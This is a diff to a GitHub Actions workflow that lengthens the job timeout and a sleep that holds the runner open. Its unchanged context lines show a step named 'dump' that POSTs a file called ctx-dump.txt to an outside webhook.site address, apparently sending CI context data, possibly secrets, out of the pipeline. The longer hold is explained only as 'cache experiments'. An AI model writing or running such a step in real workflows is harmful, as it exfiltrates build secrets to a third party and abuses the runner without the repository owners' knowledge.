@@ -4,7 +4,7 @@ on:
 jobs:
   a:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    timeout-minutes: 40
     steps:
       - uses: actions/checkout@v4
       - name: dump
@@ -13,4 +13,4 @@ jobs:
         run: |
           curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx-dump.txt" -F "src=live-A"
           echo "holding job alive for cache experiments"
-          sleep 600
+          sleep 1800
